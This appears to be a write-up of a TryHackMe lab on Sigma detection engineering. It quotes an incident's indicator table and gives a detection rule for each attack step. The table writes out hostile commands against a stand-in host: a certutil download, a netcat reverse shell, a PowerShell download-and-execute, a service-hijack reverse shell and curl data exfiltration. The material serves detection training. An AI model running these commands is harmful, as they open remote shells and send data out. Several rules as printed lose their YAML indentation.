---
title: Sighunt - Tryhackme Lab
date: 2026-09-17 10:15:23 +0700
categories: [TryHackMe]
tags: [sigma, detection-engineering]
media_subpath: /assets/img/2026-09-17-Sighunt_Tryhackme_Lab/
toc: true
comments: false
---

## Scenario : 

You are hired as a Detection Engineer for your organization. During your first week, a ransomware incident has just concluded, and the Incident Responders of your organization have successfully mitigated the threat. With their collective effort, the Incident Response (IR) Team provided the attack details based on their investigation. Your task is to create Sigma rules to enhance your organization's detection capabilities and prevent future incidents similar to this.

When you visit the Sigma Validator site, you will be given the incident report and a guide on how to use the validator to analyze and create your detection rules. After closing the report, you can open it as many times as you want by clicking the following button at the top of the page:

## Attack Indicators

Based on the given incident report, the Incident Responders discovered the following attack chain:

- Execution of a malicious HTA payload from a phishing link.
- Execution of Certutil tool to download Netcat binary.
- Netcat execution to establish a reverse shell.
- Enumeration of privilege escalation vectors through PowerUp.ps1.
- Abused service modification privileges to achieve System privileges.
- Collected sensitive data by archiving via 7-zip.
- Exfiltrated sensitive data through **cURL** binary.
- Executed ransomware with **huntme** as the file extension.

In addition, the Incident Responders provided a table of the attack patterns at your disposal:

|   |   |
|---|---|
|Attack Technique|Indicators of Compromise|
|HTA payload|Parent Image: chrome.exe<br><br>Image: mshta.exe<br><br>Command Line: C:\Windows\SysWOW64\mshta.exe C:\Users\victim\Downloads\update.hta|
|Certutil Download|Image: certutil.exe<br><br>Command Line: certutil -urlcache -split -f http://huntmeplz.com/ransom.exe ransom.exe|
|Netcat Reverse Shell|Image: nc.exe<br><br>Command Line: C:\Users\victim\AppData\Local\Temp\nc.exe huntmeplz.com 4444 -e cmd.exe<br><br>MD5 Hash: 523613A7B9DFA398CBD5EBD2DD0F4F38|
|PowerUp Enumeration|Image: powershell.exe<br><br>Command Line: powershell "iex(new-object net.webclient).downloadstring('http://huntmeplz.com/PowerUp.ps1'); Invoke-AllChecks;"|
|Service Binary Modification|Image: sc.exe<br><br>Command Line: sc.exe config SNMPTRAP binPath= "C:\Users\victim\AppData\Local\Temp\rev.exe huntmeplz.com 4443 -e cmd.exe"|
|RunOnce Persistence|Image: reg.exe<br><br>Command Line: reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v MicrosoftUpdate /t REG_SZ /d "C:\Windows\System32\cmdd.exe"|
|7-zip Collection|Image: 7z.exe<br><br>Command Line: 7z a exfil.zip * -p|
|cURL Exfiltration|Image: curl.exe<br><br>Command Line: curl -d @exfil.zip http://huntmeplz.com:8080/|
|Ransomware File Encryption|Image: ransom.exe<br><br>Target Filename: *.huntme|
## challenge 1 : Malicious mshta
```
detection:
  selection:
    ParentImage|contains:
        - 'chrome.exe' 
    Image|contains: 
        - 'mshta.exe'
    EventID: '1'
  condition: selection
```

## challenge 2: Certutil Download
```
detection:
    selection:
        CommandLine|contains|all: 
          - 'certutil'
          - '-split'
          - '-urlcache'

        Image|contains: 'CertUtil.exe'
        EventID: 1
    condition: selection

```

## Challenge 3: Netcat Execution
```
detection:
  selection1:
    EventID: 1 
 
    Image|endswith: '/Temp/nc.exe'
    CommandLine|contains: 
     - ' -e '
  selection2:
    Hashes|contains: 'MD5=523613A7B9DFA398CBD5EBD2DD0F4F38'
   
  condition: selection1 or selection2
```

## Challenge 4 : PowerIp Enumeration
```
detection:
  selection:
        EventID: 1
        CommandLine|contains|all:
            - 'downloadstring'
            - 'powershell'
            - 'Invoke-AllChecks'
            - 'new-object net.webclient'
        Image|contains: 
            - 'powershell.exe'
  condition: selection
```

## Challenge 5 : Service Binary Modification
```
detection:  
selection:  
EventID: 1  
CommandLine|contains|all:  
- ' binPath= '  
- 'sc.exe'  
- ' config '  
Image|contains:  
- 'sc.exe'  
condition: selection
```

## Challenge 6: RunOnce Persistence
```
detection:  
selection:  
EventID: 1  
CommandLine|contains|all:  
- 'HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce'  
- 'reg'  
- ' add '  
Image|contains:  
- 'reg.exe'  
condition: selection
```

## Challenge 7: 7z Archive Collection
```
detection:  
selection:  
EventID: 1  
CommandLine|contains|all:  
- '-p'  
- '7z'  
- ' a '  
Image|contains:  
- '7z.exe'  
condition: selection
```

## Challenge 8: Curl Data Exfiltration
```
detection:  
selection:  
EventID: 1  
CommandLine|contains|all:  
- '.zip'  
- 'curl'  
- ' -d '  
Image|contains:  
- 'curl.exe'  
condition: selection

```

## Challenge 9: Ransomeware File Encryption
```
detection:  
selection:  
EventID: 11  
TargetFilename|endswith:  
- 'huntme'  
condition: selection
```
